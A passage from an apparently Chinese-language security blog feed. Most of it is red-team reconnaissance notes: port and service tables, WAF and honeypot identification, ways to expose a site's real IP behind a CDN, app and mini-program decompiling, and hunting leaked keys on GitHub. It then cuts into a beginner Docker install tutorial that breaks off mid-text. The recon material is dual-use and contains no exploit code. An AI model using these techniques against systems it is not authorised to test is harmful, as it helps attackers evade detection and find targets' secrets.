27017,27018</td><td>MongoDB</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><h3 id="端口扫描的相关注意的点"><a href="#端口扫描的相关注意的点" class="headerlink" title="端口扫描的相关注意的点"></a>端口扫描的相关注意的点</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021029865.png" alt="image-20240902102903760"></p><p>如果在协议中没有http协议就不要尝试在浏览器中访问了 一般访问不到</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021030249.png" alt="image-20240902103047153"></p><p>这个也是一样的如果，没有http服务就在浏览器上访问不到</p><p>在状态中如果是filtered的话就可能是有可能开也有可能不开 可能是waf的原因也有可能这个端口仅仅只在内网中存活</p><h3 id="端口扫描扫的是什么"><a href="#端口扫描扫的是什么" class="headerlink" title="端口扫描扫的是什么"></a>端口扫描扫的是什么</h3><p>可以根据所开放的端口来判断下列东西：</p><p>应用中间件<br>数据库类型<br>其他服务协议</p><h3 id="WAF的识别"><a href="#WAF的识别" class="headerlink" title="WAF的识别"></a>WAF的识别</h3><p>由于不同的waf的防护规则不同可以试试不同的方法拿到shell</p><h4 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a><strong>方法：</strong></h4><p>（1）直接在网站上尝试注入等操作看拦截页面</p><p>（2）项目识别：</p><p>wafw00f </p><p>identYwaf</p><p>（3）在网络空间上找</p><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><h4 id="什么是蜜罐"><a href="#什么是蜜罐" class="headerlink" title="什么是蜜罐"></a>什么是蜜罐</h4><p>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法</p><h4 id="蜜罐的分类"><a href="#蜜罐的分类" class="headerlink" title="蜜罐的分类"></a>蜜罐的分类</h4><p>根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如: 数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等</p><h4 id="蜜罐产品"><a href="#蜜罐产品" class="headerlink" title="蜜罐产品"></a>蜜罐产品</h4><table><thead><tr><th>蜜罐</th><th>Quake 系统搜索语法</th></tr></thead><tbody><tr><td>STRUTSHONEYPOT</td><td>app:”StrutsHoneypot”</td></tr><tr><td>CONPOT HTTP蜜罐</td><td>app:”Conpot Http 蜜罐”</td></tr><tr><td>CONPOT MODBUS 蜜罐</td><td>app:”Conpot modbus 蜜罐”</td></tr><tr><td>CONPOT S7蜜罐</td><td>app:”Conpot s7 蜜罐”</td></tr><tr><td>KIPPO 蜜罐</td><td>app:”kippo 蜜罐”</td></tr><tr><td>HONEYPY HTTP蜜罐</td><td>app:”Honeypy Http蜜罐”</td></tr><tr><td>HONEYPY ES蜜罐</td><td>app:”Honeypy ES蜜罐”</td></tr><tr><td>AMUN IMAP蜜罐</td><td>app:”amun imap 蜜罐”</td></tr><tr><td>AMUN HTTP 蜜罐</td><td>app:”amun http 蜜罐”</td></tr><tr><td>NEPENTHES NETBIOS 蜜罐</td><td>app:”Nepenthes netbios 蜜罐”</td></tr><tr><td>NEPENTHES FTP 蜜罐</td><td>app:”Nepenthes FTP 蜜罐”</td></tr><tr><td>SSHESAME SSH 蜜罐</td><td>app:”sshesame ssh 蜜罐”</td></tr><tr><td>OPENCANARY蜜罐管理后台</td><td>app:”opencanary 蜜罐管理后台”</td></tr><tr><td>DIONAEA SIPD 蜜罐</td><td>app:”Dionaea sipd 蜜罐”</td></tr><tr><td>DIONAEA SMBD 蜜罐</td><td>app:”Dionaea smbd 蜜罐”</td></tr><tr><td>DIONAEA HTTP蜜罐</td><td>app:”Dionaea Http 蜜罐”</td></tr><tr><td>DIONAEA MSSQL蜜罐</td><td>app:”Dionaea MSSQL 蜜罐”</td></tr><tr><td>DIONAEA FTP蜜罐</td><td>app:”Dionaea ftp 蜜罐”</td></tr><tr><td>DIONAEA MEMCACHED 蜜罐</td><td>app:”Dionaea Memcached 蜜罐”</td></tr><tr><td>KOJONEY SSH 蜜罐</td><td>app:”Kojoney SSH 蜜罐”</td></tr><tr><td>WEBLOGIC 蜜罐</td><td>app:”weblogic 蜜罐”</td></tr><tr><td>MYSQL 蜜罐</td><td>app:”MySQL蜜罐”</td></tr><tr><td>HFISH 蜜罐</td><td>app:”HFish 蜜罐”</td></tr><tr><td>HFISH蜜罐管理后台</td><td>app:”HFish 蜜罐管理后台”</td></tr><tr><td>HONEYTHING物联网蜜罐</td><td>app:”honeything 物联网蜜罐”</td></tr><tr><td>ELASTICSEARCH蜜罐</td><td>app:”elasticsearch 蜜罐”</td></tr><tr><td>HOSTUS 蜜罐</td><td>app:”HostUS蜜罐”</td></tr><tr><td>WHOISSCANME 蜜罐</td><td>app:”whoisscanme 蜜罐”</td></tr><tr><td>未知蜜罐</td><td>app:“未知蜜罐”</td></tr><tr><td>COWRIE TELNETD 蜜罐</td><td>app:”Cowrie telnetd 蜜罐”</td></tr><tr><td>GLASTOPF蜜罐</td><td>app:”glastopf 蜜罐”</td></tr></tbody></table><h4 id="蜜罐的简单搭建"><a href="#蜜罐的简单搭建" class="headerlink" title="蜜罐的简单搭建"></a>蜜罐的简单搭建</h4><p>HFish的搭建：<a href="https://hfish.net/#/2-2-linux">https://hfish.net/#/2-2-linux</a>   可以一键部署</p><p>通过搭建蜜罐来了解他的工作模式从而来了解如何识别</p><h4 id="蜜罐的识别"><a href="#蜜罐的识别" class="headerlink" title="蜜罐的识别"></a>蜜罐的识别</h4><p><strong>1.人工识别</strong></p><p>可以根据一些特征端口比如：HFish默认开放4433端口</p><p>（1）端口多而有规律性   [因为有的蜜罐的内置节点有点多开放了很多连续的端口]</p><p>（2）web访问协议就下载   [意思是如果在web网页上访问一个网站的时候有可能网页所返回的并不是一个正常的HTML页面而是触发了一个下载文件]</p><p>（3）设备指纹对应分析</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409022124873.png" alt="image-20240902212429755"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409022112383.webp" alt="640"></p><p><strong>2.项目识别</strong></p><p>浏览器插件：<a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a> 注意误报率有点高</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021918160.png" alt="image-20240902191854942"></p><p>如果指纹嗅探和蜜罐告警存在的话 就已经基本确定是蜜罐了</p><p><a href="https://github.com/360quake/quake_rs/releases/tag/v3.1.9">https://github.com/360quake/quake_rs/releases/tag/v3.1.9</a></p><p>有误报 稍微好一点</p><p><strong>3.网络空间也可识别</strong></p><h4 id="CDN的一些补充"><a href="#CDN的一些补充" class="headerlink" title="CDN的一些补充"></a>CDN的一些补充</h4><p>​1.可以通过主动漏洞来得到目标网站的真实ip   [比如一些网站可以上传一些本地的图片或者一些链接而这个目标网站就会主动去加载访问这个上传的图片或者链接  这样的话我们所控制的服务器的终端就可以显示到底是谁访问的这样的话就可以知道目标网站的真实ip]   因为是目标网站主动访问所以我们在所控制的服务器的终端所得到的ip是真实的</p><p>   2.通过目标网站主动向我们发送邮件  比如：<strong>因为邮件的传输过程一般不涉及CDN</strong></p><p>（1）rss订阅   [订阅之后目标网站会不定时向你发送订阅消息]<br>（2）邮箱注册、激活处<br>（3）邮箱找回密码处<br>（4）产品更新的邮件推送<br>（5）某业务执行后发送的邮件通知<br>（6）员工邮箱、邮件管理平合等入口处的忘记密码</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409031604593.png" alt="屏幕截图 2024-09-03 160122"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409031604968.png" alt="屏幕截图 2024-09-03 160113"></p><p>需要注意的点是<strong>发件人的邮箱要跟网站的域名相同</strong>    因为一个网站可能依托于其他邮箱平台来发送邮件</p><p>​3.我们可以去主动发送邮件给一个用户名不存在的邮箱地址   <strong>大前提：[我用来发送邮件所使用的系统必须得是自己搭建的</strong> 才能够看到发送失败的消息中的真实ip]</p><p>因为如果邮箱发送失败会返回一个发送失败的消息而这个发送失败的消息中会包含目标网站的真实ip</p><p>例子：                                                                                                                                                                                                           一个邮箱地址通常由三部分组成分别是：用户名[4657576858]   分隔符[@]   域名[qq.com]                                                                                       假如说我要去查看qq.com的真实ip我只需要去给一个完全不存在的用户名[<a href="mailto:&#49;&#x32;&#x33;&#52;&#x35;&#x36;&#x37;&#x38;&#x39;&#49;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#x6d;">&#49;&#x32;&#x33;&#52;&#x35;&#x36;&#x37;&#x38;&#x39;&#49;&#x40;&#x71;&#x71;&#46;&#99;&#111;&#x6d;</a>]发邮件即可在发送失败的信息中得到qq.com的真实ip</p><p>​4.通过项目来确定</p><p>fuckcdn </p><h3 id="如何识别各类框架："><a href="#如何识别各类框架：" class="headerlink" title="如何识别各类框架："></a>如何识别各类框架：</h3><p>参考：<a href="https://blog.csdn.net/weixin_50750081/article/details/135934536">https://blog.csdn.net/weixin_50750081/article/details/135934536</a></p><p>以上需要人为查看以下部分来确定</p><p>（1）response数据包特征（有的请求包或者返回包会有get-cookie有一部分是固定的 会包含有框架名）</p><p>（2）页面ico图标</p><p>（3）特有的url路径后缀</p><p>（4）固定开放的端口</p><h2 id="APP资产"><a href="#APP资产" class="headerlink" title="APP资产"></a>APP资产</h2><h3 id="名称获取APP信息"><a href="#名称获取APP信息" class="headerlink" title="名称获取APP信息"></a>名称获取APP信息</h3><p>七麦&#x2F;点点</p><h3 id="通过url查备案来查开发者名称"><a href="#通过url查备案来查开发者名称" class="headerlink" title="通过url查备案来查开发者名称"></a>通过url查备案来查开发者名称</h3><h3 id="APP中收集资产"><a href="#APP中收集资产" class="headerlink" title="APP中收集资产"></a>APP中收集资产</h3><p>通过获取App配置、数据包，去获取 apiosskey、js等敏感信息<br>1、抓包<br>2、提取<br>3、搜索</p><h3 id="APP提取信息-静态搜集"><a href="#APP提取信息-静态搜集" class="headerlink" title="APP提取信息-静态搜集"></a>APP提取信息-静态搜集</h3><p>1、使用线上评估工具部分也可反编译<a href="https://zhihuaspace.cn:8888/recent_scans/10/10/">https://zhihuaspace.cn:8888/recent_scans/10/10/</a></p><p>2、反编译出源码来静态分析</p><h3 id="APP提取信息-动态搜集"><a href="#APP提取信息-动态搜集" class="headerlink" title="APP提取信息-动态搜集"></a>APP提取信息-动态搜集</h3><p>[注意：app抓包一定要配置好代理ip不然有可能导致网站打不开]</p><p>burp、fidder、charles抓包分析  可以抓包改包实现交互</p><p>可以收集信息的工具项目appinfoscaner</p><h1 id="MOBSF环境搭建-可以动态抓包和动态调试-强烈推荐"><a href="#MOBSF环境搭建-可以动态抓包和动态调试-强烈推荐" class="headerlink" title="MOBSF环境搭建 可以动态抓包和动态调试[强烈推荐]"></a>MOBSF环境搭建 可以动态抓包和动态调试[强烈推荐]</h1><p>优点：无误报，而且可以解决一些app因为反代理而无法抓包的问题</p><p>缺点：所收集的信息可能并不完整</p><h3 id="收集点："><a href="#收集点：" class="headerlink" title="收集点："></a>收集点：</h3><p>1、资产信息-IP 域名网站-转到对应Web测试 接口试服务测试</p><p>2、泄露信息-配置key 资源文件- key (osskey利用，邮件配置等) [oss是云存储服务]</p><p>3、代码信息-iava代码安全问题- 逆向相关</p><h3 id="框架："><a href="#框架：" class="headerlink" title="框架："></a>框架：</h3><p>​<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409101951597.png" alt="屏幕截图 2024-09-10 194914"></p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><h2 id="小程序、pc应用、APP、浏览器的web网站抓包"><a href="#小程序、pc应用、APP、浏览器的web网站抓包" class="headerlink" title="小程序、pc应用、APP、浏览器的web网站抓包"></a>小程序、pc应用、APP、浏览器的web网站抓包</h2><p>只针对http和https  <strong>burp只能抓到http和https协议的数据包</strong></p><p>设置chales将所抓到的包转发到burp中[因为burp抓包是需要配置代理而直接使用chares来进行流量转发比较容易操作]</p><p>可以使用profixer配置代理规则来抓指定的pc应用和小程序包</p><p>fidder也可将所抓取到的数据包转发到burp中 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409120932133.png" alt="image-20240912093204984"></p><p><strong>[注：以上三款工具仅仅只能用来抓http和https协议的数据包]</strong></p><h2 id="抓除了http以及https协议以外的包"><a href="#抓除了http以及https协议以外的包" class="headerlink" title="抓除了http以及https协议以外的包"></a>抓除了http以及https协议以外的包</h2><p>工具：</p><p>科来[使用门槛较低]  </p><p>wireshark</p><h2 id="封包抓取http数据包"><a href="#封包抓取http数据包" class="headerlink" title="封包抓取http数据包"></a>封包抓取http数据包</h2><p>封包[指的是通过网络传输的数据包]</p><p>可以抓关于APP的所有的数据包</p><p>用封包来抓取app的数据包的原因 （虽然科来网络分析系统和wireshark可以抓住数据包但是一些数据包是不可以发送的而且一旦发送错误的数据包可能会导致app直接死掉） （小程序和pc应用不可以）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409121222422.png" alt="image-20240912122202306"></p><p>如图：我们可以得到目标的ip地址以及端口</p><p>burp只能抓http或者https协议的数据包</p><p>如果要抓pc应用或者app的非http和https的数据包建议现阶段 先使用科来，wireshark的操作较为繁琐</p><p>微信小程序启动所对应的exe为wechatappex.exe 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409121639021.png" alt="image-20240912163859952"></p><p>因为每次打开小程序后都会在<code>C:\Users\35358\Documents\WeChat Files\Applet</code>这个文件夹下生成一个包 我们可以利用小程序助手来反编译最后我们再将反编译的文件夹结合微信开发者工具便可以在开发者工具中预览这个小程序<strong>当我们点击不同的文件的时候小程序会有不同的反应 有可能挖到未授权访问以及敏感信息泄露</strong></p><h2 id="小程序的文件结构"><a href="#小程序的文件结构" class="headerlink" title="小程序的文件结构"></a>小程序的文件结构</h2><p>1.主体结构</p><p>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。</p><p>一个小程序主体部分(即 app)由三个文件组成，必须放在项目的根目录，如下：</p><p> 文件 必需 作用 </p><p> app.js 是 小程序逻辑</p><p> app.json 是 小程序公共配置</p><p> app.wxss 否 小程序公共样式表</p><p>2.一个小程序页面由四个文件组成，分别是: </p><p> xxx.js 页面逻辑</p><p> xxx.json 页面配置</p><p> xxx.wxml 页面结构</p><p> xxx.wxss 页面样式</p><p>3.项目整体目录结构</p><p> pages 页面文件夹                                                                                                                                                </p><p>index 首页</p><p> logs 日志</p><p> utils </p><p> util 工具类(mina 框架自动生成,你也可以建立一个：api)</p><p> app.js 入口 js(类似于 java 类中的 main 方法)、全局 js</p><p> app.json 全局配置文件</p><p> app.wxss 全局样式文件</p><p> project.config.json 跟你在详情中勾选的配置一样</p><p> sitemap.json 用来配置小程序及其页面是否允许被微信索引</p><h3 id="如何获取小程序"><a href="#如何获取小程序" class="headerlink" title="如何获取小程序"></a>如何获取小程序</h3><p>百度 微信 抖音头条 支付宝</p><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>对源码架构进行分析<br>-更多的资产信息（客户信息泄露）<br>-敏感的配置信息（各种key）<br>-未授权访问测试<br>-源码中的安全问题 </p><h2 id="常见敏感key名称"><a href="#常见敏感key名称" class="headerlink" title="常见敏感key名称"></a>常见敏感key名称</h2><ol><li><p><strong>AccessKey</strong> &#x2F; <strong>AccessKeyId</strong>  </p><ul><li>说明：通常用于身份验证和授权操作。常见于云服务（如AWS、Aliyun）中，AccessKeyId用于标识用户或服务。</li></ul></li><li><p><strong>SecretKey</strong> &#x2F; <strong>SecretAccessKey</strong>  </p><ul><li>说明：配合AccessKeyId使用，是一种密钥，用于确认请求是合法的。应与AccessKeyId保密配对使用。</li></ul></li><li><p><strong>APIKey</strong>  </p><ul><li>说明：用于访问API的密钥，通常被嵌入到客户端请求中以进行身份验证和权限控制。</li></ul></li><li><p><strong>PrivateKey</strong>  </p><ul><li>说明：非对称加密中的私钥，用于解密由公钥加密的数据或签名数字证书，通常严格保密。</li></ul></li><li><p><strong>PublicKey</strong>  </p><ul><li>说明：非对称加密中的公钥，通常用于加密数据或验证数字签名，公开给其他用户或系统。</li></ul></li><li><p><strong>ClientId</strong>  </p><ul><li>说明：在OAuth2等身份验证协议中用于标识应用程序或客户端。通常与ClientSecret配合使用。</li></ul></li><li><p><strong>ClientSecret</strong>  </p><ul><li>说明：与ClientId配合使用的密钥，用于确认客户端应用的身份，防止未经授权的访问。</li></ul></li><li><p><strong>Token</strong> &#x2F; <strong>AccessToken</strong>  </p><ul><li>说明：用于API请求中的身份验证，常用于OAuth2等协议中，表示短期有效的授权。</li></ul></li><li><p><strong>SessionToken</strong>  </p><ul><li>说明：用于在一个会话期间保持用户状态的临时密钥，常用于Web应用中。</li></ul></li><li><p><strong>AuthToken</strong>  </p><ul><li>说明：用于授权的令牌，允许用户或应用程序访问受限的资源或服务。</li></ul></li><li><p><strong>OAuthToken</strong>  </p><ul><li>说明：OAuth协议中的授权令牌，用于允许第三方应用访问用户资源而不需要暴露用户的凭证。</li></ul></li><li><p><strong>Password</strong>  </p><ul><li>说明：用户或系统的登录密码，通常用于用户身份验证的第一层防护。</li></ul></li><li><p><strong>RefreshToken</strong>  </p><ul><li>说明：OAuth协议中的令牌，用于获取新的AccessToken，在AccessToken过期后继续访问资源。</li></ul></li><li><p><strong>EncryptionKey</strong>  </p><ul><li>说明：用于加密数据的密钥，可以是对称或非对称加密算法的一部分。</li></ul></li><li><p><strong>SigningKey</strong>  </p><ul><li>说明：用于数字签名的密钥，确保消息或文件的完整性和真实性。</li></ul></li><li><p><strong>MasterKey</strong>  </p><ul><li>说明：用于管理其他加密密钥的主密钥，具有极高的敏感性，通常用于加密数据或生成其他密钥。</li></ul></li><li><p><strong>SecurityKey</strong>  </p><ul><li>说明：用于身份验证和加密的安全密钥，常用于硬件设备（如U2F设备）或双重验证中。</li></ul></li><li><p><strong>SSHKey</strong>  </p><ul><li>说明：SSH（Secure Shell）协议中用于安全登录远程服务器的密钥，通常分为公钥和私钥两部分</li></ul></li></ol><h2 id="红蓝队项目合集"><a href="#红蓝队项目合集" class="headerlink" title="红蓝队项目合集"></a>红蓝队项目合集</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><h3 id="信息打点工具"><a href="#信息打点工具" class="headerlink" title="信息打点工具"></a>信息打点工具</h3><p>灯塔[不能收集edu还有gov]</p><p>Nemo[都可以收集 比较好也可进行内网的信息搜集前提要攻击队员本地搭建好可运行worker的环境，启动自定义模式的worker：]</p><h2 id="github信息搜集"><a href="#github信息搜集" class="headerlink" title="github信息搜集"></a>github信息搜集</h2><h3 id="直接域名加上关键字"><a href="#直接域名加上关键字" class="headerlink" title="直接域名加上关键字"></a>直接域名加上关键字</h3><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409181955653.png" alt="image-20240918195529526"></p><p><strong>有两个作用：</strong></p><p>1.获取更多的资产信息</p><p>2.主要是要瞅瞅有没有敏感文件泄露</p><p>（可以顺便瞅瞅项目的发布时间来辅助判定信息是否可以使用）</p><p>也可以直接搜邮箱 eg：@qq.com   或者   直接搜负责人的电话 以及相关都可以</p><h3 id="利用项目语法固定长期后续监控新泄露"><a href="#利用项目语法固定长期后续监控新泄露" class="headerlink" title="利用项目语法固定长期后续监控新泄露"></a>利用项目语法固定长期后续监控新泄露</h3><p>-基于关键字监控</p><p>-基于项目规则监控</p><p>1.<a href="https://github.com/madneal/gshark">https://github.com/madneal/gshark</a>                                                                                                                                                                 2.<a href="https://github.com/NHPT/FireEyeGoldCrystal">https://github.com/NHPT/FireEyeGoldCrystal</a>                                                                                                                                                              3. <a href="https://github.com/Explorer1092/Github-Monitor">https://github.com/Explorer1092/Github-Monitor</a></p><p><strong>目的：</strong>取得目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息(密码密匙等)<br>人员数据库等敏感信息，找到多个脆弱点。</p><h2 id="通过证书、图标查资产"><a href="#通过证书、图标查资产" class="headerlink" title="通过证书、图标查资产"></a>通过证书、图标查资产</h2><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>搜索网站：fofa quake hunter</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231425433.png" alt="屏幕截图 2024-09-23 142414"></p><p>然后再网络空间搜集即可 cert&#x3D;”github.com”</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231428156.png" alt="image-20240923142822092"></p><h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><p>搜索网站：fofa quake hunter</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231451764.png" alt="image-20240923145143663"></p><p>将一个页面的ico图标保存下来然后直接在鹰图上在图标检测中上传即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>信息打点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker学习</title>
    <link href="/2024/08/04/Docker%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/08/04/Docker%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>Docker学习</p><h1 id="一、初识Docker"><a href="#一、初识Docker" class="headerlink" title="一、初识Docker"></a>一、初识Docker</h1><h2 id="1-Docker是什么以及为什么要有docker"><a href="#1-Docker是什么以及为什么要有docker" class="headerlink" title="1.Docker是什么以及为什么要有docker"></a>1.Docker是什么以及为什么要有docker</h2><p>对于软件开发以及我们在使用一些脚本的时候常常会遇到一些问题 那就是环境变量的配置</p><p>如果想要去使用一个软件，用户必须保证两件事：操作系统的设置，各种库和组件的安装。只有它们都正确，软件才能运行。举个例子：安装一个 Python 应用，如果想要其实现他的功能 计算机必须有 Python 引擎，还必须有各种依赖项还要手动去配置环境变量</p><p><strong>Docker</strong>就相当于一个容器可以把这个应用以及他要运行所需要的所有的依赖项以及他所需要的环境都给一起打包起来 如果别人要这个软件你只需要把这个docker给他；他开箱就可直接使用</p><p>docker相对于虚拟机来说的话占用资源少 启动快</p><h2 id="2-Docker的主要用途"><a href="#2-Docker的主要用途" class="headerlink" title="2.Docker的主要用途"></a>2.Docker的主要用途</h2><p>Docker 的主要用途，目前有三大类。</p><p><strong>（1）提供一次性的环境。</strong>比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。</p><p><strong>（2）提供弹性的<strong><strong>云服务</strong></strong>。</strong>因为 Docker 容器可以随开随关，很适合动态扩容和缩容。</p><p><strong>（3）组建<strong><strong>微服务架构</strong></strong>。</strong>通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><p>Docker容器与传统的虚拟机不同，它们不包含完整的操作系统。Docker容器共享主机的操作系统内核，只包含应用程序及其依赖项。这样，Docker提供了一种更轻量级、快速和高效的虚拟化解决方案，特别适用于现代应用程序的开发、部署和运行。</p><h1 id="二、Docker的安装"><a href="#二、Docker的安装" class="headerlink" title="二、Docker的安装"></a>二、Docker的安装</h1><p>docker有两个版本：社区版（CE）、企业版（EE）</p><p>对于个人开发者来说社区版就可以</p><p>Docker CE 的安装请参考官方文档。</p><blockquote><ul><li><a href="https://docs.docker.com/docker-for-mac/install/">Mac</a></li><li><a href="https://docs.docker.com/docker-for-windows/install/">Windows</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Ubuntu</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/debian/">Debian</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/centos/">CentOS</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/fedora/">Fedora</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/binaries/">其他 Linux 发行版</a></li></ul></blockquote><p>具体安装哪个取决于你的操作系统及架构</p><p>对于我来说的的话因为是第一次安装难免会遇到一些问题而linux版本的docker文章先对来说比较多所以我建议安装Ubuntu或者CentOS版本的docker</p><p>以Ubuntu为例：首先我们要<strong>检查卸载老版本docker</strong></p><p>ubuntu下自带了docker的库，不需要添加新的源。</p><p>但是ubuntu自带的docker版本太低，需要先卸载旧的再安装新的。</p><p>注：docker的旧版本不一定被称为docker，docker.io 或 docker-engine也有可能，所以我们卸载的命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get remove docker docker-engine docker.io containerd runc</span><br></code></pre></td></tr></table></figure><p>然后</p><p>1.更新安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo apt update<br>sudo apt upgrade<br></code></pre></td></tr></table></figure><p>2.安装docker依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get install ca-certificates curl gnupg lsb-release<br></code></pre></td></tr></table></figure><p>3.添加docker软件源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;<br></code></pre></td></tr></table></figure><p>4.安装docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><p>5.配置用户组（建议）</p><p>因为docker在默认情况下只有root用户和docker用户才能够运行docker的命令，如果我们把当前用户添加到docker组，可以省去每次使用docker都需要输入密码进入root用户的麻烦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo usermod -aG docker $USER<br></code></pre></td></tr></table></figure><p>运行docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">systemctl start docker<br></code></pre></td></tr></table></figure><p>6.安装工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get -y install apt-transport-https ca-certificates curl software-properties-common<br></code></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">service docker restart<br></code></pre></td></tr></table></figure><p>查看docker版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">docker version<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100323.png" alt="img"></p><p>docker的目录如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102328.png" alt="屏幕截图 2024-08-03 141307"></p><p>在docker中有一个比较特殊的文件</p><h1 id="三、image文件"><a href="#三、image文件" class="headerlink" title="三、image文件"></a>三、image文件</h1><p><strong>Docker 把应用程序及其依赖，打包在 image 文件里面。</strong>只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p><p>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出本机的所有 image 文件。</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image <span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 image 文件</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image <span class="hljs-built_in">rm</span> [imageName]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102635.png" alt="屏幕截图 2024-08-03 142443"></p><p>image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。</p><p>为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 <a href="https://hub.docker.com/">Docker Hub</a> 是最重要、最常用的 image 仓库。此外，出售自己制作的 image 文件也是可以的。</p><h1 id="四、实例：hello-world"><a href="#四、实例：hello-world" class="headerlink" title="四、实例：hello world"></a>四、实例：hello world</h1><p>这个就会涉及到一个操作：需要将 image 文件从仓库抓取到本地（需要说明的是，国内连接 Docker 的官方仓库很慢，还会断线，需要将默认仓库改成国内的镜像网站）</p><h2 id="1-改镜像"><a href="#1-改镜像" class="headerlink" 